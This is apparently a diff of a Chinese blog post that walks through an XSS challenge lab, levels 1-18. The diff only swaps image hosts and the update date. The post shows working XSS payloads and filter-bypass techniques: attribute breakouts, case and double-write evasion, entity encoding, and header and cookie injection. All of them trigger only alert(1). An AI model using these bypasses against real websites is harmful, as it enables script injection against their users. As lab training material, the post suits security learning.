@@ -248,7 +248,7 @@
             
               <p class="note note-info">
                 
-                  本文最后更新于：2021年2月8日 凌晨
+                  本文最后更新于：2021年2月13日 凌晨
                 
               </p>
             
@@ -259,122 +259,122 @@
 <p>常用测试语句：</p>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;alert(<span class="hljs-number">1</span>)&lt;/script&gt;<br>&lt;img src=x onerror=alert(<span class="hljs-number">1</span>)&gt;<br>&lt;svg onload=alert(<span class="hljs-number">1</span>)&gt;<br>&lt;a href=javascript:alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure>
 <h2 id="Level1"><a href="#Level1" class="headerlink" title="Level1"></a>Level1</h2><p>url为：<a target="_blank" rel="noopener" href="http://xssaq.com/yx/level1.php?name=test">http://xssaq.com/yx/level1.php?name=test</a><br>GET型，源码显示<br>在传参处插入代码即可：?name=<code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
-<h2 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h2><p>Url为:<a target="_blank" rel="noopener" href="http://xssaq.com/yx/level2.php?keyword=test">http://xssaq.com/yx/level2.php?keyword=test</a><br>GET型,输入<code>&lt;script&gt;alert(/hack11/)&lt;/script&gt;</code>：<br><img src="https://img-blog.csdnimg.cn/20210103103711865.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<p>构造闭合，即<code>&quot;&gt;&lt;script&gt;alert(/hack11/)&lt;/script&gt;//</code><br>“和&gt;将其之前的语句闭合为value=&lt;””&gt;,//或者&lt;”将后方”&gt;注释<br><img src="https://img-blog.csdnimg.cn/20210103103719220.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<h2 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h2><p>Value同2，value=””&gt;<br><code>&lt;script&gt;alert(/hack11/)&lt;/script&gt;</code>,查看响应，后端将&lt;&gt;过滤了<br><img src="https://img-blog.csdnimg.cn/20210103103825266.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<p>查看源码，使用了htmlspecialchars函数<br><img src="https://img-blog.csdnimg.cn/20210103103838449.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210103103859273.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<h2 id="Level2"><a href="#Level2" class="headerlink" title="Level2"></a>Level2</h2><p>Url为:<a target="_blank" rel="noopener" href="http://xssaq.com/yx/level2.php?keyword=test">http://xssaq.com/yx/level2.php?keyword=test</a><br>GET型,输入<code>&lt;script&gt;alert(/hack11/)&lt;/script&gt;</code>：<br><img src="https://i.loli.net/2021/02/13/DBNOTv9yuzCqMQm.png" srcset="/img/loading.gif"></p>
+<p>构造闭合，即<code>&quot;&gt;&lt;script&gt;alert(/hack11/)&lt;/script&gt;//</code><br>“和&gt;将其之前的语句闭合为value=&lt;””&gt;,//或者&lt;”将后方”&gt;注释<br><img src="https://i.loli.net/2021/02/13/GHM4a78wmlZrt1f.png" srcset="/img/loading.gif"></p>
+<h2 id="Level3"><a href="#Level3" class="headerlink" title="Level3"></a>Level3</h2><p>Value同2，value=””&gt;<br><code>&lt;script&gt;alert(/hack11/)&lt;/script&gt;</code>,查看响应，后端将&lt;&gt;过滤了<br><img src="https://i.loli.net/2021/02/13/IBsk2vCh5fR4oFD.png" srcset="/img/loading.gif"></p>
+<p>查看源码，使用了htmlspecialchars函数<br><img src="https://i.loli.net/2021/02/13/n5wQOlJ4BMG6Xms.png" srcset="/img/loading.gif"><br><img src="https://i.loli.net/2021/02/13/FSEZ6xjpqacyXD1.png" srcset="/img/loading.gif"></p>
 <p>可以使用不带有尖括号的特殊字符进行尝试<br>如：<code>&#39; onclick=&#39;alert(1)</code><br>（利用了HTML DOM 的onclick事件，点击后触发包含的命令）    </p>
 <ul>
 <li>第一个单引号的作用：闭合<code>value=&#39;</code></li>
-<li>第二个单引号的作用：与valuer=’’的第二个引号对应，构成<code>onclick=&#39;alert(1)&#39;</code><br><img src="https://img-blog.csdnimg.cn/20210103103909655.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
+<li>第二个单引号的作用：与valuer=’’的第二个引号对应，构成<code>onclick=&#39;alert(1)&#39;</code><br><img src="https://i.loli.net/2021/02/13/ifQhPs5CEXYJcbD.png" srcset="/img/loading.gif"></li>
 </ul>
-<h2 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h2><p>输入：<code>&quot;&gt;&lt;script&gt;alert(/hack11/)&lt;/script&gt;//</code>        ，<code>&lt;&gt;</code>被过滤<br><img src="https://img-blog.csdnimg.cn/20210103103917456.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
-<p>类似level3，不同的是单引号换为双引号构造闭合：<br><code>&quot; onclick=&quot;alert(1)</code><br><img src="https://img-blog.csdnimg.cn/20210103103921171.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<h2 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h2><p>输入：<code>&quot;&gt;&lt;script&gt;alert(/hack11/)&lt;/script&gt;//</code>        ，<code>&lt;&gt;</code>被过滤<br><img src="https://i.loli.net/2021/02/13/5XnuHTlBzUYPGSi.png" srcset="/img/loading.gif"></p>
+<p>类似level3，不同的是单引号换为双引号构造闭合：<br><code>&quot; onclick=&quot;alert(1)</code><br><img src="https://i.loli.net/2021/02/13/hVZxg39tKsEAfpG.png" srcset="/img/loading.gif"></p>
 <h2 id="Level5"><a href="#Level5" class="headerlink" title="Level5"></a>Level5</h2><ul>
-<li><p>尝试 <code>&quot;&gt;&lt;script&gt;alert(/hack11/)&lt;/script&gt;&lt;&quot;</code>，发现script被过滤<br><img src="https://img-blog.csdnimg.cn/20210103103926143.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p>尝试 <code>&quot;&gt;&lt;script&gt;alert(/hack11/)&lt;/script&gt;&lt;&quot;</code>，发现script被过滤<br><img src="https://i.loli.net/2021/02/13/fwqic3VlrZvYRz2.png" srcset="/img/loading.gif"></p>
 </li>
-<li><p>尝试<code>&quot; onclick=&quot;alert(1)</code>，发现on被过滤<br><img src="https://img-blog.csdnimg.cn/2021010310392937.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p>尝试<code>&quot; onclick=&quot;alert(1)</code>，发现on被过滤<br><img src="https://i.loli.net/2021/02/13/lLNBKGCsAtcQom8.png" srcset="/img/loading.gif"></p>
 </li>
-<li><p>最终poc：<code>&quot;&gt;&lt;a href=javascript:alert(1)&gt;&lt;&quot;</code><br><img src="https://img-blog.csdnimg.cn/2021010310393347.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>点击即可触发<br><img src="https://img-blog.csdnimg.cn/2021010310393639.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p>最终poc：<code>&quot;&gt;&lt;a href=javascript:alert(1)&gt;&lt;&quot;</code><br><img src="https://i.loli.net/2021/02/13/2QKFvDzJmacTxYS.png" srcset="/img/loading.gif"><br>点击即可触发<br><img src="https://i.loli.net/2021/02/13/YLMlUZ6IVq3mwtj.png" srcset="/img/loading.gif"></p>
 </li>
 </ul>
 <h2 id="Level6"><a href="#Level6" class="headerlink" title="Level6"></a>Level6</h2><ul>
-<li><p>构造 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>    ，<code>script</code>被过滤<br><img src="https://img-blog.csdnimg.cn/20210103103939777.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p>构造 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>    ，<code>script</code>被过滤<br><img src="https://i.loli.net/2021/02/13/mkcMn8bqDWVdLpg.png" srcset="/img/loading.gif"></p>
 </li>
-<li><p>构造 <code>&lt;img src=x onerror=alert(1)&gt;</code>  ,<code>src</code>,<code>on</code>被过滤<br><img src="https://img-blog.csdnimg.cn/20210103103942592.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p>构造 <code>&lt;img src=x onerror=alert(1)&gt;</code>  ,<code>src</code>,<code>on</code>被过滤<br><img src="https://i.loli.net/2021/02/13/h4gtFHRDqI5KBpf.png" srcset="/img/loading.gif"></p>
 </li>
-<li><p>构造 <code>&lt;a href=javascript:alert(1)&gt;</code>     ，<code>href</code>被过滤<br><img src="https://img-blog.csdnimg.cn/20210103103945301.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p>构造 <code>&lt;a href=javascript:alert(1)&gt;</code>     ，<code>href</code>被过滤<br><img src="https://i.loli.net/2021/02/13/yCrAILKH3dzEfgl.png" srcset="/img/loading.gif"></p>
 </li>
 </ul>
 <ul>
-<li>最终poc1：<br><code>&quot;&gt;&lt;a Href=javascript:alert(1)&gt;&lt;&quot;</code> 进行大小写绕过<br><img src="https://img-blog.csdnimg.cn/20210103103948721.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210103103952207.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
+<li>最终poc1：<br><code>&quot;&gt;&lt;a Href=javascript:alert(1)&gt;&lt;&quot;</code> 进行大小写绕过<br><img src="https://i.loli.net/2021/02/13/PDRVBjso12MxYXH.png" srcset="/img/loading.gif"><br><img src="https://i.loli.net/2021/02/13/ZJ73fWwcuYhzxFe.png" srcset="/img/loading.gif"></li>
 </ul>
 <ul>
-<li>最终poc2：<br><code>&quot; ONclick=&quot;alert(1)</code>，其他亦同<br><img src="https://img-blog.csdnimg.cn/20210103103956320.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
+<li>最终poc2：<br><code>&quot; ONclick=&quot;alert(1)</code>，其他亦同<br><img src="https://i.loli.net/2021/02/13/ejVWHLoqZrpixaf.png" srcset="/img/loading.gif"></li>
 </ul>
 <ul>
-<li>源码：过滤部分关键字，没有对大小写进行针对<br><img src="https://img-blog.csdnimg.cn/20210103104000396.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
+<li>源码：过滤部分关键字，没有对大小写进行针对<br><img src="https://i.loli.net/2021/02/13/Lo31XaGHvIMRitw.png" srcset="/img/loading.gif"></li>
 </ul>
 <h2 id="Level7"><a href="#Level7" class="headerlink" title="Level7"></a>Level7</h2><ul>
 <li>老四样测试，script、src、on、href皆被置换为空</li>
 </ul>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;alert(<span class="hljs-number">1</span>)&lt;/script&gt; <br>&lt;img src=x onerror=alert(<span class="hljs-number">1</span>)&gt;<br>&lt;svg onload=alert(<span class="hljs-number">1</span>)&gt;<br>&lt;a href=javascript:alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210103104125172.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210103104130106.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210103104133318.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210103104137413.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="https://i.loli.net/2021/02/13/8CW54NmTldBEvLa.png" srcset="/img/loading.gif"><br><img src="https://i.loli.net/2021/02/13/zZEaPMpcVQT5LCt.png" srcset="/img/loading.gif"><br><img src="https://i.loli.net/2021/02/13/RfE3meS25jqy4oz.png" srcset="/img/loading.gif"><br><img src="https://i.loli.net/2021/02/13/qMYmV7ZT8KC1t2J.png" srcset="/img/loading.gif"></p>
 <ul>
 <li>尝试大小写绕过，会将输入全部转换为小写，在匹配关键词置换为空</li>
-<li>poc(双写绕过)：<br><code>&quot;&gt;&lt;a hrhrefef=javascriscriptpt:alert(1)&gt;&lt;&quot;</code><br><img src="https://img-blog.csdnimg.cn/20210103104141300.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210103104149942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
+<li>poc(双写绕过)：<br><code>&quot;&gt;&lt;a hrhrefef=javascriscriptpt:alert(1)&gt;&lt;&quot;</code><br><img src="https://i.loli.net/2021/02/13/wq1KlSz2TGdJ6DR.png" srcset="/img/loading.gif"><br><img src="https://i.loli.net/2021/02/13/4rtTgZfAanjWYc7.png" srcset="/img/loading.gif"></li>
 </ul>
 <ul>
 <li>源码：过滤部分关键字：strtolower把所有字符转换为小写再进行过滤</li>
 </ul>
-<p><img src="https://img-blog.csdnimg.cn/20210103104152751.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="https://i.loli.net/2021/02/13/tMjuFApHsYIP7xc.png" srcset="/img/loading.gif"></p>
 <h2 id="Level8"><a href="#Level8" class="headerlink" title="Level8"></a>Level8</h2><ul>
-<li><p>‘添加友情链接’，应为DOM型xss<br><code>&lt;a href=javascript:alert(1)&gt;</code>：<br>href，javascript都被过滤，大小写和双写绕过都失效<br><img src="https://img-blog.csdnimg.cn/20210103104158240.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p>‘添加友情链接’，应为DOM型xss<br><code>&lt;a href=javascript:alert(1)&gt;</code>：<br>href，javascript都被过滤，大小写和双写绕过都失效<br><img src="https://i.loli.net/2021/02/13/okHQ72fMaguFmEr.png" srcset="/img/loading.gif"></p>
 </li>
-<li><p>尝试编码绕过<br><code>javascript:alert(1)</code><br><img src="https://img-blog.csdnimg.cn/20210103104201134.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p>尝试编码绕过<br><code>javascript:alert(1)</code><br><img src="https://i.loli.net/2021/02/13/4NfeLIc6BguKdrZ.png" srcset="/img/loading.gif"></p>
 </li>
 <li><p>Burpsuite编码</p>
 </li>
 </ul>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;	<br></code></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/20210103104208625.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="https://i.loli.net/2021/02/13/jyH9wteMQIm2xhD.png" srcset="/img/loading.gif"></p>
 <h2 id="Level9"><a href="#Level9" class="headerlink" title="Level9"></a>Level9</h2><ul>
 <li>DOM型，基于Level8多了一个判定，查看源码，需在构造语句后加上<code>http://</code><br>即：</li>
 </ul>
 <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;<span class="hljs-comment">//http://</span><br></code></pre></td></tr></table></figure>
 <ul>
-<li>源码：<br>同8，先将关键字替换，再判断变量后是否有<code>http://</code><br>Strpos($str,’http://’)：查找http://在字符串中第一次出现的位置<br><img src="https://img-blog.csdnimg.cn/20210103104218698.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
+<li>源码：<br>同8，先将关键字替换，再判断变量后是否有<code>http://</code><br>Strpos($str,’http://’)：查找http://在字符串中第一次出现的位置<br><img src="https://i.loli.net/2021/02/13/WqVb1EzPLfopyCx.png" srcset="/img/loading.gif"></li>
 </ul>
 <h2 id="Level10"><a href="#Level10" class="headerlink" title="Level10"></a>Level10</h2><ul>
-<li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code>        过滤了<code>&lt;&gt;</code>，尝试编码不能绕过，无法构造事件触发xss、无法利用属性的javascript协议、无法利用css注入<br><img src="https://img-blog.csdnimg.cn/20210103104223338.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code>        过滤了<code>&lt;&gt;</code>，尝试编码不能绕过，无法构造事件触发xss、无法利用属性的javascript协议、无法利用css注入<br><img src="https://i.loli.net/2021/02/13/rkp8zyZWtIailOT.png" srcset="/img/loading.gif"></p>
 </li>
-<li><p>存在三个input变量，尝试提交<br>源码：<code>&lt;input name=&quot;t_sort&quot;  value=&quot; &#39;.$str33.&#39; &quot; type=&quot;hidden&quot;&gt;</code><br>Payload：<code>1&amp;t_sort=  &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://img-blog.csdnimg.cn/20210103104229599.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><code>1&amp;t_sort=xxx</code> 将xxx作为t_sort的value输入<br><code>&quot; type=&quot;text&quot; onclick=&quot;alert(1) </code>是置入value    的语句<br><code>type=&quot;text&quot;</code> 形成可点击的文本框，方便触发其后的onclick=”alert(1)</p>
+<li><p>存在三个input变量，尝试提交<br>源码：<code>&lt;input name=&quot;t_sort&quot;  value=&quot; &#39;.$str33.&#39; &quot; type=&quot;hidden&quot;&gt;</code><br>Payload：<code>1&amp;t_sort=  &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://i.loli.net/2021/02/13/oKn6UHsgJPMIrqj.png" srcset="/img/loading.gif"><br><code>1&amp;t_sort=xxx</code> 将xxx作为t_sort的value输入<br><code>&quot; type=&quot;text&quot; onclick=&quot;alert(1) </code>是置入value    的语句<br><code>type=&quot;text&quot;</code> 形成可点击的文本框，方便触发其后的onclick=”alert(1)</p>
 </li>
 </ul>
 <h2 id="Level11"><a href="#Level11" class="headerlink" title="Level11"></a>Level11</h2><ul>
-<li><p>查看源码<br>仅t_sort和t_ref的可传参，<br><code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;];//</code>将payload从http头的referer栏获取<br><img src="https://img-blog.csdnimg.cn/20210103104242894.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p>查看源码<br>仅t_sort和t_ref的可传参，<br><code>$str11=$_SERVER[&#39;HTTP_REFERER&#39;];//</code>将payload从http头的referer栏获取<br><img src="https://i.loli.net/2021/02/13/2CutM5RFrlQoBhX.png" srcset="/img/loading.gif"></p>
 </li>
-<li><p>一．<br>浏览器插件修改referfer，<code>value=1&amp;t_sort=  &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://img-blog.csdnimg.cn/2021010310424745.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p>一．<br>浏览器插件修改referfer，<code>value=1&amp;t_sort=  &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://i.loli.net/2021/02/13/JVetGAoDWhNuriS.png" srcset="/img/loading.gif"></p>
 </li>
-<li><p>二．<br>利用burpsuite在跳转至该网页时抓包，修改其中<code>referer</code>为<code>poc</code>即可<br><code>1&amp;t_sort=  &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://img-blog.csdnimg.cn/20210103104250718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p>二．<br>利用burpsuite在跳转至该网页时抓包，修改其中<code>referer</code>为<code>poc</code>即可<br><code>1&amp;t_sort=  &quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://i.loli.net/2021/02/13/brkZhBiJusDGMmT.png" srcset="/img/loading.gif"></p>
 </li>
 </ul>
 <h2 id="Level12"><a href="#Level12" class="headerlink" title="Level12"></a>Level12</h2><ul>
-<li>输入：<code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://img-blog.csdnimg.cn/20210103104256128.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210103104300543.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
+<li>输入：<code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://i.loli.net/2021/02/13/FOBly6kYp5hQAxZ.png" srcset="/img/loading.gif"><br><img src="https://i.loli.net/2021/02/13/8EiaVFOuep1N5nZ.png" srcset="/img/loading.gif"></li>
 </ul>
 <ul>
-<li>从标头中的User-Agent中获取<br>User-Agent：<code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://img-blog.csdnimg.cn/20210103104302889.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
+<li>从标头中的User-Agent中获取<br>User-Agent：<code>&quot; type=&quot;text&quot; onclick=&quot;alert(1)</code><br><img src="https://i.loli.net/2021/02/13/W5JizDwSFlqy62Y.png" srcset="/img/loading.gif"></li>
 </ul>
-<h2 id="Level13"><a href="#Level13" class="headerlink" title="Level13"></a>Level13</h2><p>如图<br><img src="https://img-blog.csdnimg.cn/20210103104321557.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<h2 id="Level13"><a href="#Level13" class="headerlink" title="Level13"></a>Level13</h2><p>如图<br><img src="https://i.loli.net/2021/02/13/EZn9j6qgMdRUGXS.png" srcset="/img/loading.gif"></p>
 <ul>
-<li>查看标头<br><img src="https://img-blog.csdnimg.cn/20210103104326596.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></li>
+<li>查看标头<br><img src="https://i.loli.net/2021/02/13/WDyMe6XP7w9vTs8.png" srcset="/img/loading.gif"></li>
 </ul>
 <ul>
 <li>修改cookie<br>Cookie：<code>user=&quot;type=&quot;text&quot; onclick=&quot;alert(1)&quot;</code></li>
 </ul>
-<p><img src="https://img-blog.csdnimg.cn/20210103104328932.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p><img src="https://i.loli.net/2021/02/13/dsWx4JaFARcfgEp.png" srcset="/img/loading.gif"></p>
 <h2 id="Level14"><a href="#Level14" class="headerlink" title="Level14"></a>Level14</h2><p>百度一下：本关因iframe调用的文件地址失效，无法进行测试。要考的应该是通过修改    iframe调用的文件来实现xss注入</p>
 <h2 id="Level15"><a href="#Level15" class="headerlink" title="Level15"></a>Level15</h2><ul>
-<li><p>ng-include指令一般用于包含外部的 HTML 文件，ng-include属性的值可以是一个表达    式，返回一个文件名，但是默认情况下，包含的文件需要包含在同一个域名下。<br><img src="https://img-blog.csdnimg.cn/20210103104335693.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p>ng-include指令一般用于包含外部的 HTML 文件，ng-include属性的值可以是一个表达    式，返回一个文件名，但是默认情况下，包含的文件需要包含在同一个域名下。<br><img src="https://i.loli.net/2021/02/13/fTDSb42LBXuZdjy.png" srcset="/img/loading.gif"></p>
 </li>
 <li><p>可以包含一个有漏洞的页面进行破解<br>eg:    <code>level15.php?src=&#39;name=&lt;script&gt;alert(1)&lt;/script&gt;&#39;</code></p>
 </li>
 </ul>
 <h2 id="Level16"><a href="#Level16" class="headerlink" title="Level16"></a>Level16</h2><ul>
-<li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210103104340627.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://i.loli.net/2021/02/13/NBiRrWhDmXpkYeZ.png" srcset="/img/loading.gif"></p>
 </li>
-<li><p>空格、反斜杠、script都被str_replace函数替换成&amp;nbsp<br><img src="https://img-blog.csdnimg.cn/20210103104344405.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p>空格、反斜杠、script都被str_replace函数替换成&amp;nbsp<br><img src="https://i.loli.net/2021/02/13/vw2HtkGNqFW1ylD.png" srcset="/img/loading.gif"></p>
 </li>
-<li><p>HTML中可以将%0a或者%0D当成空格使用，故可构造<br>Poc：<code>&lt;svg%0aonload=alert(1)&gt;</code><br><img src="https://img-blog.csdnimg.cn/20210103104347190.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p>HTML中可以将%0a或者%0D当成空格使用，故可构造<br>Poc：<code>&lt;svg%0aonload=alert(1)&gt;</code><br><img src="https://i.loli.net/2021/02/13/WOAj6vXTerNdChY.png" srcset="/img/loading.gif"></p>
 </li>
 </ul>
 <h2 id="Level17"><a href="#Level17" class="headerlink" title="Level17"></a>Level17</h2><ul>
-<li><p>Url中：level17.php?arg01=123&amp;arg02=321<br>将arg01和arg02的结果用=拼接<br><img src="https://img-blog.csdnimg.cn/20210103104351645.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p>Url中：level17.php?arg01=123&amp;arg02=321<br>将arg01和arg02的结果用=拼接<br><img src="https://i.loli.net/2021/02/13/H7Wjb1OS5twXYq2.png" srcset="/img/loading.gif"></p>
 </li>
-<li><p>可利用此构造：<code>onclick=javascript:alert(/xss/)</code><br>Poc：<code>level17.php?arg01= onmousemove&amp;arg02=javascript:alert(/xss/)</code><br><img src="https://img-blog.csdnimg.cn/20210103104355713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<li><p>可利用此构造：<code>onclick=javascript:alert(/xss/)</code><br>Poc：<code>level17.php?arg01= onmousemove&amp;arg02=javascript:alert(/xss/)</code><br><img src="https://i.loli.net/2021/02/13/CmdPrh5uHVcEkyG.png" srcset="/img/loading.gif"></p>
 </li>
 </ul>
-<h2 id="Level18"><a href="#Level18" class="headerlink" title="Level18"></a>Level18</h2><p>同17<br><img src="https://img-blog.csdnimg.cn/20210103104358763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTUwODMyMw==,size_16,color_FFFFFF,t_70" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<h2 id="Level18"><a href="#Level18" class="headerlink" title="Level18"></a>Level18</h2><p>同17<br><img src="https://i.loli.net/2021/02/13/DUo8dhKymzrpJEQ.png" srcset="/img/loading.gif"></p>
 
             </div>
             <hr>
